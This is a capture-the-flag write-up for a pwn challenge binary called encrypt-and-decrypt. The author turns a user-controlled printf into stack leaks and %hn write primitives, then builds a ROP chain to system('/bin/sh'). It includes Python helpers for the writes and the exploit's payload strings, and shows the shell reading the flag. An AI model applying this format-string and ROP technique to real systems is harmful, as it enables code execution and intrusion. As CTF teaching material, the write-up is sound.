# Encrypt-and-decrypt writeup

I don't really do pwn, but organazers dropped 2 android (YUCK), 1 python pickle( EW) and simple rust rev, so there was nothing to do.
It seems that the intended solution used gets() to overflow the buffer, but I solved without it


## Reversing the logic

Application generates a random master key (16 bytes)

Promts user with scanf(%d\n") for either 1 to encrypt or 2 to decrypt.

Encrypt:
 - Generates 16 random bytes for IV
 - fgets 16 chars at max from user
 - trunkates the last 15th and 16th if they are present
 - checks if input is A to Z (high letters only)
 - XORS with IV
 - encrypts with AES CBC
 - prints out iv and result in hex

Decrypt:
 - gets user string, the intended format for it is iv + result
 - checks if the string is 0x40 hex suitable chars
 - Decrypts with AES CBC
 - XORS with IV
 - print via printf(output)

## Attack vectors

Immidiatly I noticied gets, overflowed the buffer and gracefully smashed the stack and segfaulted.

Upon closer inspection I decided to check what is on the stack and to noone's surprise there is a stack canary right after the 
```
mov     rax, fs:28h
```

So i abandoned the idea with gets :-)


Gazing into the scanf("%d\n") in hopes of divine intervention it came to me that the output from decrypt is actually user controlled.

We can encrypt an arbitrary string - ABCDABCDABCDAB, get its iv and result and since the IV is xored with the decrypted result at the end, We xor the IV with the string we want and get printf with controlled format.

This allows us an arbitrary read from the stack past the rsp with %offset$p and arbitrary write with %n shenanigans. I am now realising that this was propbably enought to leak the canary from the stack and use gets as a normal person, but I missed that somehow.

## Analysing what is available to grab from the stack

Looking at the stack and the registers right before the call:
```
RSI 000000000000000F - len of the string
RDX C55E5390500695CB - leak of the last 8 bytes of the last round key
RCX 00007FFFFFFFD5F0 - Juicy stack pointer -> rsp + 0xd0 and 0x88 away from the ret addr
R8  00007FFFF7FA8C88 - libc.so.6:main_arena+8 (IDA annotation, havent looked into it)
R9  0000000000000000

and then the stack
```
Doing printf("%3$p") leaks stack pointer with known offset

looking closer at the stack we see that printf("%49$p") leaks the ret addr to libc.

so theoretically we are set, apart from we cannot write to the stack, %n to the rescue!

## Convoluted write primitives

we find that at %54$p (this is 54th argument to printf) is a pointer to the stack (to the %83$p),  this sounds like a write primitive canditate

so to actually write 2 bytes where we want to we first write the 2 bytes where we want to write (83rd argument), reading that addr from 54th argument
```
dest_short = dest_short & 0xFFFF
s1 = b'%.'
s2 = str(dest_short).encode("ascii")
s3 = b'd%54$hn'
padlen = max(0, 16 - (len(s1) + len(s2) + len(s3)))
```

and then we read from the 83rd argument and write to now destination address the bytes we actually want with
```
d1 = b'%.'
d2 = str(bts_short).encode("ascii")
d3 = b'd%83$hn'
padlen = max(0, 16 - (len(d1) + len(d2) + len(d3)))
```

2 bytes offset is ok, since those arguments are close to each other (the 54th and 83rd).

So from that we can actually make an 8 byte write primitive
just repeating that 4 times and adjusting the values a bit:

```
def write8prim(bts_LONGLONG, dest_short):
    b1 = bts_LONGLONG & 0xFFFF
    b2 = (bts_LONGLONG >> 16) & 0xFFFF
    b3 = (bts_LONGLONG >> 32) & 0xFFFF
    b4 = (bts_LONGLONG >> 48) & 0xFFFF
    write2primEpilog(b1, dest_short)
    write2primEpilog(b2, dest_short + 2)
    write2primEpilog(b3, dest_short + 4)
    if (b4 == 0):
        return
    write2primEpilog(b4, dest_short + 6)
```


## Exploitation
We leaked the pointers, we have an arbitrary write primitive, we are set?

The stack we wanted to have at the end:

```
retaddr - 0x10 | CANARY         |  we just dont touch that
retaddr - 0x8  | 1              | idk what that is
retaddr        | pop rdi;  ret  |  Gadget
retaddr + 0x8  | ptr to /bin/sh | string from libc
retaddr + 0x10 | ret gadget     | (needed for stack alignment)
retaddr + 0x18 | system()       | funciton from libc
```

After quickly getting the shell on my machine I moved on to the server and realised they had a different libc version...

Using the libc_return_to_main_start_call_verylongname offset I narrowed it down to 10 libc versions, which I had to download one by one and find the offset for a pop rdi; ret gadget.

And finally it we got the output:

```
[+] Opening connection to encrypt-and-decrypt.challs.csc.tf on port 1337: Done
exploit str = b'%49$p-----------' === 16
exploit str = b'%3$p------------' === 16
libc: 7d7c2d607d90  base: 7ffec8697080
ReT ADDR =  0x7ffec8697108
[+] RDI
exploit str = b'%.28936d%53$hn--' === 16
exploit str = b'%.33765d%83$hn--' === 16
exploit str = b'%.28938d%53$hn--' === 16
exploit str = b'%.11616d%83$hn--' === 16
exploit str = b'%.28940d%53$hn--' === 16
exploit str = b'%.32124d%83$hn--' === 16
[+] binsh
exploit str = b'%.28944d%53$hn--' === 16
exploit str = b'%.26232d%83$hn--' === 16
exploit str = b'%.28946d%53$hn--' === 16
exploit str = b'%.11643d%83$hn--' === 16
exploit str = b'%.28948d%53$hn--' === 16
exploit str = b'%.32124d%83$hn--' === 16
[+] stack align
exploit str = b'%.28952d%53$hn--' === 16
exploit str = b'%.33766d%83$hn--' === 16
exploit str = b'%.28954d%53$hn--' === 16
exploit str = b'%.11616d%83$hn--' === 16
exploit str = b'%.28956d%53$hn--' === 16
exploit str = b'%.32124d%83$hn--' === 16
[+] system()
exploit str = b'%.28960d%53$hn--' === 16
exploit str = b'%.60784d%83$hn--' === 16
exploit str = b'%.28962d%53$hn--' === 16
exploit str = b'%.11618d%83$hn--' === 16
exploit str = b'%.28964d%53$hn--' === 16
exploit str = b'%.32124d%83$hn--' === 16
Ez
[*] Switching to interactive mode
$ 3
$ 3
$ ls
encrypt-and-decrypt
flag.txt
$ cat flag.txt
CSCTF{EncryP7_y0UR_p4Yl0ad}
$
```

You can notice that here the 53rd arg is used and not 54th, this is once again due to libc version difference

